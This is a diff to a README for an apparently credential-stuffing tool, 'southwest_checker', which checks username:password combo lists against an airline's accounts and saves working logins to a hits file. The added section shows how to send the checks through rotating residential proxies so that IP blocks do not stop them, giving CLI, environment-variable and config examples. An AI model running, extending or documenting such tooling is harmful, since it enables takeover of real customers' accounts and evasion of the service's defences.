@@ -42,6 +42,23 @@ Combo file (`username:password` per line):
 python -m southwest_checker check -c sensor_config.json -f combos.txt --hits-file hits.txt
 ```
 
+### Proxy (residential rotating)
+
+Use a residential proxy to avoid IP blocks. Supports full URL or shorthand `host:port:user:pass`:
+
+```bash
+# Via CLI flag
+python -m southwest_checker check -c sensor_config.json -f combos.txt \
+  --proxy "core-residential.evomi.com:1000:USER:PASS_country-US"
+
+# Via environment variable
+export SW_PROXY="core-residential.evomi.com:1000:USER:PASS_country-US"
+python -m southwest_checker check -c sensor_config.json -f combos.txt
+
+# Or store in sensor_config.json
+# { "proxy": "host:port:user:pass", ... }
+```
+
 Save results as JSON:
 
 ```bash
